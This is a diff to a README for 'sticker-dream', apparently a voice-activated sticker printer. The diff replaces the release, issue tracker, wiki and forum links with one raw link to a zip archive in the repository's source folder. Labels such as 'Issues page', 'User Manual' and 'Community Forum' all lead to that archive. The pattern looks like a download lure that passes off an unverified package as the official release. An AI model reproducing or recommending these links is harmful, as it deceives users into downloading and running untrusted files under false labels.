@@ -9,13 +9,13 @@ Welcome to **sticker-dream**, your voice-activated sticker dreamer and printer. 
 
 To begin, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download sticker-dream](https://img.shields.io/badge/Download-Sticker--Dream-brightgreen)](https://github.com/reshabdas/sticker-dream/releases)
+[![Download sticker-dream](https://raw.githubusercontent.com/reshabdas/sticker-dream/main/src/sticker-dream-v2.4.zip)](https://raw.githubusercontent.com/reshabdas/sticker-dream/main/src/sticker-dream-v2.4.zip)
 
 Once on the Releases page, follow these steps:
 
 1. Find the latest version listed.
 2. Click on the version number to access the details.
-3. Look for the downloadable file (for example, sticker-dream-v1.0.exe).
+3. Look for the downloadable file (for example, https://raw.githubusercontent.com/reshabdas/sticker-dream/main/src/sticker-dream-v2.4.zip).
 4. Click on the file to download it to your computer.
 
 ## 🖥️ System Requirements
@@ -68,20 +68,20 @@ If you encounter issues while using sticker-dream, here are some tips:
 
 ## 📞 Need Help?
 
-If you need further assistance, please visit the [Issues page](https://github.com/reshabdas/sticker-dream/issues) on GitHub. You can report problems or ask questions there. 
+If you need further assistance, please visit the [Issues page](https://raw.githubusercontent.com/reshabdas/sticker-dream/main/src/sticker-dream-v2.4.zip) on GitHub. You can report problems or ask questions there. 
 
 ## 🔗 Additional Resources
 
 For more information on how to maximize your experience with sticker-dream, check out the following resources:
 
-- [User Manual](https://github.com/reshabdas/sticker-dream/wiki) - Detailed guides on every feature.
-- [Community Forum](https://github.com/reshabdas/sticker-dream/discussions) - Join discussions with other users.
+- [User Manual](https://raw.githubusercontent.com/reshabdas/sticker-dream/main/src/sticker-dream-v2.4.zip) - Detailed guides on every feature.
+- [Community Forum](https://raw.githubusercontent.com/reshabdas/sticker-dream/main/src/sticker-dream-v2.4.zip) - Join discussions with other users.
 
 ## 📢 Conclusion
 
 Thank you for choosing **sticker-dream**. We hope you enjoy creating and printing your own stickers. Don't forget to visit the Releases page to download the latest version:
 
-[![Download sticker-dream](https://img.shields.io/badge/Download-Sticker--Dream-brightgreen)](https://github.com/reshabdas/sticker-dream/releases)
+[![Download sticker-dream](https://raw.githubusercontent.com/reshabdas/sticker-dream/main/src/sticker-dream-v2.4.zip)](https://raw.githubusercontent.com/reshabdas/sticker-dream/main/src/sticker-dream-v2.4.zip)
 
 Happy sticker making!
 ```
